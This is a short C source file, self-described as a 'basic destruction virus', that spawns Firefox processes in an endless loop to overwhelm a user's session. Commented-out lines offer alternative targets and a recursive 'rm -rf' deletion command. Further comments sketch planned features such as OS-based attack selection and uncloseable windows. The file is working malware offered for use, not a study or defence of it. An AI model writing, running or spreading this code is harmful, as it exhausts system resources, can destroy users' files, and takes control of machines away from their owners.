#include <stdio.h>
#include <stdlib.h>
// filename: bullshit.c
// file description: basic destruction virus 
// destroys a live session by spam-spawning processes
// disarm instructions: simply close terminal window
// cautions: You may lose unsaved work, stress your system, or even destroy your OS by using and modifying this script
// disclaimer: any damage caused by this program is the responsibility of the fool who decided to mess around
int main() {

	printf("welcome to the infinite loop, SUCKER!");	

	while(420>69){
		printf("gimme all your memory FOOL");
		system("firefox&"); 	     // spawns infinite firefoxes
		
		// OTHER FUN INFINITE LOOP IDEAS (UNCOMMENT FOR FUN AND CHAOS)
		//system("start .");	     // for Windows; starts infinite file managers
		//system("nautilus&);	     // same as above but on Nautilus, eg. stock GNOME Ubuntu
		//system("nemo&);	     // same as above but on Nemo eg. stock Mint Cinnamon
		//system("gedit&");	     // miscellaneous ideas
		//system("notepad&);
		//system("rm -rf ./* && rmdir ./* && cd .."); // somewhat meaner, with additional recursive destruction, even more with overwrite and sudo
		// abstract ideas (you'll have to implement these. I will when I get some time): 
		// attack selection alg. based on OS detect >> availability
		// terminal window spam
		// OS identification logic in complete_bullshit.c
		// add an uncloseable Java bullshit window to bullshit.c
		// also add infinite mouseclick 'fun' overlay
	}
}
